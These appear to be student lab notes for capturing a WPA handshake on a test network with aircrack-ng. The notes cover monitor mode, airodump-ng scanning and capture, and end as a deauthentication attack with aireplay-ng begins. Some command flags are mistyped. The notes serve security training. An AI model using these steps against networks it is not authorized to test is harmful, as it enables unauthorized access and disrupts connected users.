


1. Let us start off with the following command, to make sure we have the WIFI adapter working correctly : 


>[!command]
>
>`ip addr`
>
>>[!output]
>>
>>![[Pasted image 20241106121341.png]]



2. Run the command “$ sudo airmon-ng check kill” to kill all wireless processes.



>[!command]
>
>`sudo airmon-ng check kill`
>
>>[!output]
>>
>>![[Pasted image 20241106121731.png]]



3. The network card is in the default “managed” mode. It must be changed to “**monitor**” mode. Monitor mode allows the wireless network adapter to capture the packets we’ll need to decrypt the WPA password. Change modes by entering the command: $ sudo airmon-ng start wlan0


>[!command]
>
>`sudo airmon-ng start wlan0`
>
>>[!output]
>>
>>![[Pasted image 20241106121939.png]]


4. Next, you’ll need to discover the wireless networks within range. In this instance you’re looking for BSSID (wireless network name) **D317-U6-LAB06** which is the test network setup that will be “attacked.” Enter the following command to scan for wireless networks and their BSSID’s: 
   
>[!command]
>
>`sudo airodump-ng wlan0mon`
>
>>[!output]
>>
>>![[Pasted image 20241106122427.png]]
>>
>>
   
   
   Look for the BSSID for the D317-U6-LAB06 wireless network and record it by copying and pasting to a notepad for accuracy and ease of access.

5. Let us narrow down the results to wireless networks of interest : 



>[!command]
>
>`sudo airodump-ng wlan0mon -d "9E:05:D6:14:41:C2"`
>
>>[!output]
>>
>>![[Pasted image 20241106123210.png]]
>>
>>
   

6. Next, we need at least one wireless client connected to the wireless network. 
   
>[!info]
   >
   >The attack works by de-authenticating a connected client. In most real world cases, the de-auth’d client will attempt to reconnect to the wireless network. The re-authentication process is where we’ll be capturing the data we need. During the re-authentication we will capture the 4-way handshake information used to decrypt the WPA key. If you see no connected clients you will need to manually connect a wireless client which you will then de-auth in the next step. Note: in a real world situation connecting your own wireless client is not practical as you would need the WPA key in order to do so. However, most wireless networks in production will have clients connected for you to de-auth.
   
   
   While the `sudo airodump-ng wlan0mon -d "9E:05:D6:14:41:C2"` command is running, we connect our client to the network ( not realistic in the field, but for learning purposes, we know the password) : 


![[Pasted image 20241106123909.png]]

7. We would now issue the following command to capture the 4-way handshake : 

>[!command]
>
>`sudo airodump-ng –w hack1 –c 1 –bsid “9E:05:D6:14:41:C2” wlan0mon`
>
>>[!output]
>>
>>![[Pasted image 20241106131628.png]]



8. De-authentiate the client which will then attempt to re-authenticate to the wireless network revealing the 4 way handshake information we need to decrypt the WPA key. Open a new terminal window and enter the command: $ sudo aireplay-ng –deauth 0 -a “BSSID of wireless network” wlan0mon